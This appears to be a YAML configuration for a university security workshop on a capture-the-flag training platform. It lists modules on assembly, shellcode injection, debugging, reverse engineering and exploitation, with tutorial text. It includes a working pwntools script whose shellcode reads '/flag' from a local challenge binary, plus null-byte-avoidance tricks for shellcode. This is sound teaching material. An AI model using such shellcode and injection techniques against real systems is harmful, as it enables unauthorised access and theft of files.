id: uh-workshop-24

name: University of Hawaii 2024 Workshop
type: workshop


modules:
- import:
    dojo: linux-luminarium
    module: hello
- import:
    dojo: linux-luminarium
    module: paths
- import:
    dojo: linux-luminarium
    module: commands
  description: |
    For these series of challenges, you'll be learning how to write assembly code!
    
    ## How to Assemble

    First, write your assembly (say, in file `a.s`):

    ```
    .global _start
    .intel_syntax noprefix
    _start:
    mov rdi, 0x1337
    ```

    Then, assemble it (this will produce file `a.out`):

    ```
    gcc -nostdlib a.s
    ```

    Disassemble it to make sure everything looks good!

    ```
    objdump -M intel -d a.out
    ```

  challenges:
    - import:
        challenge: level-1
    - import:
        challenge: level-2-a
    - import:
        challenge: level-2
    - import:
        challenge: level-3
    - import:
        challenge: level-4
    - import:
        challenge: level-5
    - import:
        challenge: level-6-a
    - import:
        challenge: level-6
    - import:
        challenge: level-7
    - import:
        challenge: level-8
    - import:
        challenge: level-9
    - import:
        challenge: level-10-a
    - import:
        challenge: level-10-b
    - import:
        challenge: level-10
    - import:
        challenge: level-11-a
    - import:
        challenge: level-11
    - import:
        challenge: level-12
    - import:
        challenge: level-13
    - import:
        challenge: level-14
    - import:
        challenge: level-15
    - import:
        challenge: level-16
    - import:
        challenge: level-17-a
    - import:
        challenge: level-17-b
    - import:
        challenge: level-17

- import:
    dojo: program-security
    module: shellcode-injection
  description: |
    For these series of challenges, you'll build on your knowledge of assembly to write shellcode!
    ## Funky Shellcode Tricks!

    ### Pushing 64-bit immediates:

    You can’t push a 64-bit immediate in AMD64 directly (i.e., there is no such instruction as `push 0x1122334455667788`), but you can push it *indirectly* using rip-relative addressing. Consider the following code:

    ```
    .global _start
    .intel_syntax noprefix
    _start:
    # write "Hello!"
    push [rip+our_string]
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 7
    mov rax, 1
    syscall

    # exit
    mov rax, 60
    syscall

    our_string:
    .string "Hello!\n"
    ```

    The `push [rip+data]` in that sample will read the 8-byte string `Hello!\n\0` from later in the shellcode (the `our_string` label) and push it to the stack. It’s similar to pushing that value directly, just with an added (implicit) memory read.

    ### Moving data without `mov`

    You can move data between registers without the `mov` instruction, by using the stack as an intermediate. For example: `mov rax, rbx` can be approximated with `push rbx; pop rax`.

    You might need to point other registers at the stack (for example, if you store filenames there). You can do that with `push rsp; pop rdx`. Now, `rdx` points at the top of the stack.

    ### Avoiding Null bytes

    Instructions which take immediate values will take varaible length  immediates depending upon the destination register, if the immediate  value which you are using is capable of being represented with fewer  bytes then, for many instructions, you will inevitably have null bytes  at the beginning of this integer in memory. You will need to use  different variants of the instruction by referencing smaller portions of the destination registers (al instead of rax).

    Nullbytes will also occur when loading strings by default

    Example: Avoiding Null Bytes in Filenames

    The problem:

    ```
    lea rdi, [rip+filename]

    filename:
        .string "/flag"
    ```

    Assembling this will generate null bytes, as you can see here:

    ```
    00000000: 488d 3d00 0000 002f 666c 6167 00         H.=..../flag.
    ```

    So how do we get rid of the null bytes? We can modify our code while it’s running to inject the required null bytes:

    ```
    lea rdi, [rip+filename] ;load filename
    add rdi, 5              ;add 5 to the pointer (this puts us at the first 'A')
    xor eax, eax            ;clear out rax to use as a null byte
    mov BYTE PTR [rdi], al  ;write the value of al (a null byte!) over the 'A'

    filename:
        .ascii "/flagAAAA"
    ```

    After assembling:

    ```
    00000000: 488d 3d08 0000 0048 83c7 0531 c088 072f  H.=....H...1.../
    00000010: 666c 6167 4141 41                        flagAAA
    ```

    As you can see, this no longer has null bytes in it, but when you run it, ‘/flag’ will become null terminated!

    # pwntools crash course

    pwntools is a ctf/exploitation python library pre-installed in the challenge levels.

    ### Shellcoding with pwntools

    pwntools can be used to pass shellcode to a challenge similar to how this was done in previous modules. 

    ```
    from pwn import *

    context.arch = "amd64"
    context.log_level = "debug"

    assembly = """
    // store /flag
    mov rbx, 0x67616c662f
    push rbx
    mov rdi, rsp

    // Open
    mov rax, 2
    mov rsi, 0
    mov rdx, 0
    syscall

    // Read
    mov rdi, rax
    mov rax, 0
    mov rsi, rsp
    mov rdx, 0x100
    syscall

    // Write
    mov rax, 1
    mov rdi, 1
    syscall
    """

    # Create shellcode and store in file
    shellcode = asm(assembly)
    open("shellcode", "wb").write(shellcode)

    # Start a process
    proc = process("/challenge/babyshell_level1")

    # Read until a specified output
    targetstr = "Reading 0x1000 bytes from stdin."
    print(proc.recvuntil(targetstr).decode())

    # Pass shellcode to target process
    proc.sendline(shellcode)

    # Read everything from the target process
    print(proc.recvall().decode('latin-1'))
    ```

    pwntools makes it easy to interact with a process.  This is  particularly useful when a challenge leaks (prints) an address that  later needs to be included in the shellcode.

    Also note that the last line calls `proc.recvall()`.  This is an important step because it will wait for the process to  close the output pipe before it finishes reading. Using other  instructions in order to cleanup the final output gets messy quick as  you do not know how much to read. 

    The process class has a number of useful functions to accomplish this.  Some examples include:

    ```
    process.send()
    process.recv()
    process.recvuntil()
    ```

    Full documentation can be found at https://docs.pwntools.com/en/stable/tubes.html
  challenges:
    - import:
        challenge: level-1
    - import:
        challenge: level-2
    - import:
        challenge: level-3
    - import:
        challenge: level-4
    - import:
        challenge: level-5

- import:
    dojo: computing-101
    module: debugging-refresher
  description: |
    For these series of challenges, you'll dig into how to use a debugger to figure out what's going on.

    ## GDB Quick Reference

    **Usage:**

    ```
    gdb ./a.out
    ```

    **NOTE:** Install GEF! https://github.com/hugsy/gef GEF is a set of extension commands for GDB that *drastically* improves your user experience. There are other alternatives as well (PEDA, Pwndbg, etc.).

    Use the following command to install `GEF` in the dojo:

    ```
    echo "source /opt/gef/gef.py" > ~/.gdbinit
    ```


    In addition, there's a [video on installing GEF and demoing the features](https://youtu.be/iEerxtuVSks).

    **Bug Note**: GEF and Pwndbg (likely others) do not play nicely with gdb breakpoint `commands`. (This is a [known bug](https://github.com/hugsy/gef/issues/836).)

    To get around this, write your gdb scripts into a file (let’s say called `./commands`), and run the script from the commands line by passing `gdb` the `-n` option (which disables loading the `.gdbinit` file):

    ```
    gdb ./a.out -n -x ./commands
    ```

    You can also pass these options to the `embryogdb` challenges like so:

    ```
    /challenge/babyrev_level5 -n -x ./commands
    ```

    **Additional Tools:**

    `strace` will print a system call trace of your program

    **Starting Execution:**

    `r arg1 arg2 arg3 ..` will run the target with a variable number of arguments (successive run calls preserve args, so you only need to enter them once)

    `starti` will start the target and place you at the very first instruction executed.

    `start` will start the target and place you at the main procedure, in most programs this will be `main()` if GDB can locate it.

    **Stepping Execution:**

    `si` (step instruction) will step you into functions one instruction at a time

    `ni` (next instruction) will step *over* calls one instruction at a time

    **Examining Memory/Registers:**

    `info reg` will print out all your registers

    `p` will print things in hex, for example `p $rax` will print the value in rax.

    `x/nuf add` will examine memory where `n`, `u`, and `f` represent the following:

    `n` is the number of entries you want examined

    `u` is the unit size, so `b` (byte), `h` (halfword, 2 bytes), `w` (word, 4 bytes), `g` (giant word, 8 bytes)

    `f` corresponds to the format in which you want the data displayed, the two most common are `x` (hex) and `i` (instructions)

    Examples:

    ```
    x/gx 0x4010000 -> Examine a "giant words" at address 0x401000
    x/gx 0x401000  -> Examine a word at address 0x401000
    x/8bx 0x401000 -> Examine 8 bytes at address 0x401000
    x/8i 0x401000  -> Examine 8 instructions at address 0x40100
    x/10gx $rsp+8  -> Examine 10 “giant words” at stack pointer + 8 bytes
    ```

    **Breakpoints:**

    Remember that you can use `int3` (`0xcc`) to set a breakpoint in your shellcode!

    `b *addr` will set a breakpoint at that address

    `info b` will show you all of your current breakpoints along with an associated index

    `disable breakpoint_index` and `enable breakpoint_index` can be used to toggle breakpoints on/off depending on the index (found with `info b`).

    `disas func_name` will disassemble the function and print out all the instructions/offsets/addresses.

    `disas func_name+offset` set a breakpoint from an offset in a function (found with `disas`)

- import:
    dojo: program-security
    module: reverse-engineering

  description: |
    For these series of challenges you'll need to understand how a program works by only looking at the binary code.
    
  challenges:
    - import:
        challenge: level-1-0
    - import:
        challenge: level-1-1
    - import:
        challenge: level-2-0
    - import:
        challenge: level-2-1
    - import:
        challenge: level-3-0
    - import:
        challenge: level-3-1
    - import:
        challenge: level-6-0
    - import:
        challenge: level-6-1
    - import:
        challenge: level-7-0
    - import:
        challenge: level-7-1
    - import:
        challenge: level-9-0
    - import:
        challenge: level-9-1
    - import:
        challenge: level-10-0
    - import:
        challenge: level-10-1
    - import:
        challenge: level-13-0
    - import:
        challenge: level-13-1
    - import:
        challenge: level-14-0
    - import:
        challenge: level-14-1
    - import:
        challenge: level-15-0
    - import:
        challenge: level-15-1
- import:
    dojo: program-security
    module: memory-errors
- import:
    dojo: program-security
    module: program-exploitation
  challenges:
    - import:
        challenge: level-1-0
    - import:
        challenge: level-1-1
    - import:
        challenge: level-2-0
    - import:
        challenge: level-2-1
    - import:
        challenge: level-3-0
    - import:
        challenge: level-3-1
    - import:
        challenge: level-4-0
    - import:
        challenge: level-4-1
    - import:
        challenge: level-5-0
    - import:
        challenge: level-5-1
    - import:
        challenge: level-6-0
    - import:
        challenge: level-6-1
    
